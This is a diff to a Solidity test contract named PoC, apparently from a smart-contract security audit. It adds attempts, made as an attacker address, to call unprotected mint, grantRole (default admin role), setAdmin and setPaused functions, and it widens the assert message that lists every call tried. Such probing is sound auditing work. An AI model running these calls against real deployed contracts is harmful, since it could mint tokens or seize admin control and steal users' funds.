@@ -122,6 +122,32 @@ contract PoC is Test {
             attacker, before, "sweep(address)", abi.encodeWithSignature("sweep(address)", attacker)
         );
         if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "mint(uint256)",
+            abi.encodeWithSignature("mint(uint256)", 1000 ether)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker, before, "mint(address)", abi.encodeWithSignature("mint(address)", attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "grantRole(bytes32,address)",
+            abi.encodeWithSignature("grantRole(bytes32,address)", bytes32(0), attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker, before, "setAdmin(address)", abi.encodeWithSignature("setAdmin(address)", attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker, before, "setPaused(bool)", abi.encodeWithSignature("setPaused(bool)", true)
+        );
+        if (bytes(used).length > 0) return used;
         return "";
     }
 
@@ -140,7 +166,7 @@ contract PoC is Test {
         assertGt(
             delta,
             0,
-            "no privileged action changed observable state. Tried mint(address,uint256), setOwner(address), transferOwnership(address), pause(), unpause(), withdraw(), withdrawAll(), drain(), sweep(address). This does NOT establish safety: the privileged function may be guarded by an owner check, named differently, take other arguments, or be reachable only by the owner."
+            "no privileged action changed observable state. Tried mint(address,uint256), setOwner(address), transferOwnership(address), pause(), unpause(), withdraw(), withdrawAll(), drain(), sweep(address), mint(uint256), mint(address), grantRole(bytes32,address) (role bytes32(0), the AccessControl default admin role), setAdmin(address), setPaused(bool). This does NOT establish safety: the privileged function may be guarded by an owner check, named differently, take other arguments, or be reachable only by the owner."
         );
     }
 }
